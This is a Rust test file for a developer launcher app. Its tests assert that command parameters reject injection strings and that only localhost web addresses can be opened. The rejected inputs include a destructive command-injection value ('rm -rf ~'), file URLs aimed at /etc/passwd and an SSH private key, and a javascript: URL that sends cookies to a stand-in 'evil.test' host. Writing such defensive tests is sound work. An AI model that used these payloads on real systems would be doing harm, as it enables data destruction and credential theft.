//! What the interface is able to *say*.
//!
//! The guards next door assert that no command has a parameter for a program, a
//! path or a URL. These assert the other half: that the parameters which do
//! exist admit nothing but the values they are meant to.
//!
//! This is the boundary a compromised page would attack. It is a `serde`
//! deserialisation, so the test is a deserialisation — the same code, with the
//! same input, that an `invoke` would reach (`security-and-privacy.md` §5).

use mira_core::AppKind;
use mira_platform::{plan, LaunchTarget, Os};
use serde_json::json;

/// The one enum a launch is asked for by.
fn kind(raw: serde_json::Value) -> Result<AppKind, serde_json::Error> {
    serde_json::from_value(raw)
}

#[test]
fn a_kind_is_one_of_exactly_three_words() {
    for accepted in ["editor", "terminal", "browser"] {
        assert!(kind(json!(accepted)).is_ok(), "{accepted} must deserialise");
    }
    assert_eq!(AppKind::ALL.len(), 3, "and there are no others");
}

#[test]
fn nothing_that_looks_like_a_command_is_a_kind() {
    // Every one of these is what an attacker would try to put where the kind
    // goes. None of them is a variant, so none of them survives the wire.
    for refused in [
        json!("/bin/sh"),
        json!("code --wait /etc"),
        json!("open"),
        json!("Editor"),
        json!("editor; rm -rf ~"),
        json!(0),
        json!(["editor"]),
        json!({ "editor": "/bin/sh" }),
        json!(null),
    ] {
        assert!(
            kind(refused.clone()).is_err(),
            "{refused} must not deserialise into a kind"
        );
    }
}

#[test]
fn a_launch_target_cannot_be_sent_at_all() {
    // The type that carries a path or an address is not `Deserialize`, so it
    // cannot appear in a command signature even by accident. This test is here
    // to fail the day someone derives it.
    //
    // Compile-time, expressed as a fact: `LaunchTarget` is constructed in Rust
    // from a project row or from an observed port, and there is no third way.
    let from_a_row = LaunchTarget::Directory("/home/dev/aviora".into());
    let from_a_port = LaunchTarget::WebAddress("http://localhost:3000".to_owned());

    assert_ne!(from_a_row, from_a_port);
}

#[test]
fn an_address_that_is_not_a_web_address_is_refused_before_anything_opens() {
    for refused in [
        "file:///etc/passwd",
        "file:///Users/dev/.ssh/id_rsa",
        "javascript:fetch('http://evil.test/'+document.cookie)",
        "data:text/html,<script>alert(1)</script>",
        "vscode://file/etc/passwd",
        "smb://192.168.1.1/share",
        "HTTP://localhost:3000",
    ] {
        let attempt = plan(
            Os::MacOs,
            AppKind::Browser,
            LaunchTarget::WebAddress(refused.to_owned()),
            |_| true,
        );
        assert!(
            matches!(attempt, Err(mira_core::MiraError::Invalid { .. })),
            "{refused} must be refused, got {attempt:?}"
        );
    }
}

#[test]
fn the_only_addresses_the_product_can_build_are_loopback() {
    // `live.open_service` takes a `u16`, so the reachable set of addresses is
    // the whole of `http://localhost:0`..`:65535` and nothing else. Spot-checked
    // at both ends and asserted for shape.
    for port in [0_u16, 1, 3000, 8080, u16::MAX] {
        let built = format!("http://localhost:{port}");
        assert!(mira_platform::is_openable(&built));
        assert!(plan(
            Os::MacOs,
            AppKind::Browser,
            LaunchTarget::WebAddress(built),
            |_| true
        )
        .is_ok());
    }
}
